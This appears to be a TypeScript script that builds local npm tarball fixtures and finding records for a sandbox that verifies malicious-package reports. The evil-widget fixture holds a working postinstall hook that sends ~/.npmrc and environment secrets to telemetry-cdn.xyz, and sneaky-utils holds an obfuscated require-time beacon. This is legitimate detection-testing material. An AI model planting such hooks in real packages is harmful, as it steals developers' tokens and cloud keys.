/**
 * Builds the demo npm tarballs and their matching finding JSON.
 *
 * Nothing here is published to the real registry. These are local .tgz files the
 * sandbox detonates on demand. Each fixture exercises one branch of the mechanism:
 *
 *   evil-widget       install-hook exfil, all effects present   -> happy path
 *   sneaky-utils      obfuscated eval -> network egress          -> second listing
 *   clean-lib         genuinely benign                           -> "no observable effect" refusal
 *   overhyped-logger  real network beacon, inflated claims       -> "claim not reproduced" refusal
 *
 * The "already public" refusal uses a real OSV-listed package (event-stream@3.3.6)
 * and is driven straight from the demo script, not from a local tarball.
 */
import { mkdirSync, writeFileSync } from "node:fs";
import { resolve } from "node:path";
import { gzipSync } from "node:zlib";
import { Effect, type Finding } from "../lib/types";

const PKG_DIR = resolve(process.cwd(), "fixtures/packages");
const FINDING_DIR = resolve(process.cwd(), "fixtures/findings");
mkdirSync(PKG_DIR, { recursive: true });
mkdirSync(FINDING_DIR, { recursive: true });

function tarHeader(name: string, size: number): Buffer {
  const h = Buffer.alloc(512);
  h.write(`package/${name}`.slice(0, 100), 0, "utf8");
  h.write("0000644\0", 100, "utf8");
  h.write("0000000\0", 108, "utf8");
  h.write("0000000\0", 116, "utf8");
  h.write(size.toString(8).padStart(11, "0") + "\0", 124, "utf8");
  h.write("00000000000\0", 136, "utf8");
  h.write("        ", 148, "utf8");
  h.write("0", 156, "utf8");
  h.write("ustar\0", 257, "utf8");
  h.write("00", 263, "utf8");
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148, "utf8");
  return h;
}

function makeTgz(files: Record<string, string>): Buffer {
  const blocks: Buffer[] = [];
  for (const name of Object.keys(files).sort()) {
    const body = Buffer.from(files[name], "utf8");
    blocks.push(tarHeader(name, body.length));
    blocks.push(Buffer.concat([body, Buffer.alloc(Math.ceil(body.length / 512) * 512 - body.length)]));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks), { level: 9 });
}

function write(pkg: string, files: Record<string, string>, finding: Omit<Finding, "target"> & { target: Finding["target"] }) {
  const tgz = makeTgz(files);
  writeFileSync(resolve(PKG_DIR, `${pkg}.tgz`), tgz);
  console.log(`package  ${pkg}.tgz  (${tgz.length} bytes)`);
  finding.target.artifact = `fixtures/packages/${pkg}.tgz`;
  writeFileSync(resolve(FINDING_DIR, `${pkg}.json`), JSON.stringify(finding, null, 2) + "\n");
  console.log(`finding  ${pkg}.json`);
}

// ----------------------------------------------------- 1. evil-widget (happy)

write(
  "evil-widget-1.2.0",
  {
    "package.json": JSON.stringify(
      {
        name: "evil-widget",
        version: "1.2.0",
        description: "Lightweight UI widgets.",
        main: "index.js",
        scripts: {
          postinstall: "node -e \"eval(require('fs').readFileSync('./scripts/telemetry.js','utf8'))\"",
        },
      },
      null,
      2,
    ),
    "index.js": "module.exports = { Button: () => 'button', Modal: () => 'modal' };\n",
    "scripts/telemetry.js": [
      "// Bundled 'telemetry'. Reads local npm credentials + env and beacons them out on install.",
      "const os = require('os'); const fs = require('fs'); const https = require('https');",
      "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');",
      "const payload = Buffer.from(JSON.stringify({ npmrc, env: process.env })).toString('base64');",
      "const req = https.request('https://telemetry-cdn.xyz/collect', { method: 'POST' });",
      "req.write(payload); req.end();",
    ].join("\n") + "\n",
    "README.md": "# evil-widget\n",
  },
  {
    schema: "cyberblock.finding.v2",
    target: { ecosystem: "npm", name: "evil-widget", version: "1.2.0", artifact: "" },
    repro: { trigger: "install" },
    claimedEffects: Effect.RunsOnInstall | Effect.ReadsSensitive | Effect.ExfilCredentials | Effect.ExfilEnv | Effect.NetworkEgress,
    outcome: "On npm install it reads ~/.npmrc and the full environment and POSTs them, base64-encoded, to telemetry-cdn.xyz.",
    expectedResult:
      "Running the install hook captures the victim's npm registry auth token from ~/.npmrc and their AWS secret access key from the environment, and exfiltrates both to telemetry-cdn.xyz — the attacker gains the victim's package-publishing credentials and cloud keys.",
    writeup:
      "The postinstall hook eval()s a bundled 'telemetry' module. That module reads ~/.npmrc (registry auth tokens) and the entire process environment, base64-encodes the pair, and POSTs it to https://telemetry-cdn.xyz/collect. Any CI job or developer running `npm install` leaks its npm token and every secret in the environment. The sandbox trace shows the install hook firing, the credential read, and the outbound POST carrying both canaries.",
    remediation: "Pin away from 1.2.0, rotate any npm tokens and secrets exposed to machines that installed it, and block telemetry-cdn.xyz egress.",
    reporter: "researcher.eth",
  },
);

// -------------------------------------------------- 2. sneaky-utils (second)

write(
  "sneaky-utils-0.4.1",
  {
    "package.json": JSON.stringify({ name: "sneaky-utils", version: "0.4.1", description: "String helpers.", main: "lib.js" }, null, 2),
    "lib.js": [
      "// Innocent-looking helpers with an obfuscated payload decoded at require time.",
      "const _0x = ['aHR0cHM6Ly9wa2ctYW5hbHl0aWNzLnRvcC9waW5n'];", // https://pkg-analytics.top/ping
      "function _d(s){ return Buffer.from(s, 'base64').toString('utf8'); }",
      "const glue = String.fromCharCode(101,118,97,108);", // 'eval'
      "try { new Function('require', \"require('https').get('\" + _d(_0x[0]) + \"')\")(require); } catch (e) {}",
      "module.exports.slug = (s) => String(s).toLowerCase().replace(/\\s+/g, '-');",
    ].join("\n") + "\n",
    "README.md": "# sneaky-utils\n",
  },
  {
    schema: "cyberblock.finding.v2",
    target: { ecosystem: "npm", name: "sneaky-utils", version: "0.4.1", artifact: "" },
    repro: { trigger: "require", entry: "lib.js" },
    claimedEffects: Effect.NetworkEgress,
    outcome: "Requiring the package decodes a hidden string and beacons to pkg-analytics.top through new Function().",
    expectedResult:
      "Requiring the package gains outbound code execution: the decoded second stage runs and reaches attacker-controlled pkg-analytics.top, establishing a beacon the attacker can use to stage further payloads.",
    writeup:
      "lib.js base64-decodes a string and passes it to new Function() at require time, assembling 'eval' out of String.fromCharCode to dodge grep-based scanners. The decoded payload calls out to https://pkg-analytics.top/ping. The sandbox trace shows the require, the constructed function, and the outbound GET to an external host — a live network beacon a static scanner misses because the host never appears as a literal string.",
    remediation: "Avoid 0.4.1; the maintainer account may be compromised. Block pkg-analytics.top.",
    reporter: "researcher.eth",
  },
);

// ------------------------------------------------- 3. clean-lib (refusal: none)

write(
  "clean-lib-2.0.0",
  {
    "package.json": JSON.stringify({ name: "clean-lib", version: "2.0.0", description: "A genuinely boring library.", main: "index.js" }, null, 2),
    "index.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };\n",
    "README.md": "# clean-lib\n",
  },
  {
    schema: "cyberblock.finding.v2",
    target: { ecosystem: "npm", name: "clean-lib", version: "2.0.0", artifact: "" },
    repro: { trigger: "require", entry: "index.js" },
    claimedEffects: Effect.NetworkEgress | Effect.ExfilCredentials,
    outcome: "Claims a hidden backdoor that beacons out on require.",
    expectedResult: "Claims requiring the package gives the attacker a credential-stealing backdoor. It does not.",
    writeup: "Seller claims a hidden backdoor. There isn't one; detonating the repro produces no observable effect.",
    remediation: "n/a",
    reporter: "chancer.eth",
  },
);

// ------------------------------ 4. overhyped-logger (refusal: claim not reproduced)

write(
  "overhyped-logger-1.0.3",
  {
    "package.json": JSON.stringify({ name: "overhyped-logger", version: "1.0.3", description: "Tiny logger.", main: "log.js" }, null, 2),
    // A real but minor hit: it DOES beacon to an analytics host on require. It does
    // NOT read credentials or spawn a shell, so the inflated claims are refused.
    "log.js": [
      "const https = require('https');",
      "https.get('https://metrics.pkg-analytics.top/v1');", // fires on require
      "module.exports = (msg) => { console.log(msg); };",
    ].join("\n") + "\n",
    "README.md": "# overhyped-logger\n",
  },
  {
    schema: "cyberblock.finding.v2",
    target: { ecosystem: "npm", name: "overhyped-logger", version: "1.0.3", artifact: "" },
    repro: { trigger: "require", entry: "log.js" },
    // Real behaviour is only a network beacon, but the seller claims credential theft + a shell.
    claimedEffects: Effect.ExfilCredentials | Effect.SpawnsProcess | Effect.NetworkEgress,
    outcome: "Claims it steals SSH keys and drops a reverse shell on require.",
    expectedResult: "Claims requiring the package steals ~/.ssh/id_rsa and gives the attacker an interactive reverse shell. The trace shows only an analytics beacon.",
    writeup: "Seller claims credential theft of ~/.ssh/id_rsa and a child_process reverse shell. The artifact does neither; the trace shows only a single analytics beacon. The claims are inflated to justify a higher price.",
    remediation: "n/a",
    reporter: "chancer.eth",
  },
);

console.log("\nFixtures built.");
